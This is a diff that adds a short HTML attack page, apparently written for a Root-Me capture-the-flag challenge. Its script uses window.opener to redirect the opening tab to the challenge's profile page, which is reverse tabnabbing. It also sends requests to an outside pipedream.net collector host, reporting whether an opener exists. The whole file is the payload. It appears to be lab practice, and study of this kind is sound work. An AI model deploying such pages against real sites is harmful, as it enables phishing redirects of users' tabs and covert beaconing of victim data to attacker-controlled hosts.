@@ -1,0 +1,15 @@
+<!DOCTYPE html>
+
+<body>
+
+<script>
+
+
+if (opener) {
+	opener.location.replace('http://challenge01.root-me.org:58003/profile')
+	fetch('https://en6gc9c8vfzvo.x.pipedream.net/?opener' + opener, {mode: 'no-cors'})
+} else {
+	fetch('https://en6gc9c8vfzvo.x.pipedream.net/?noOpener=', {mode: 'no-cors'})
+}
+</script>
+</body>
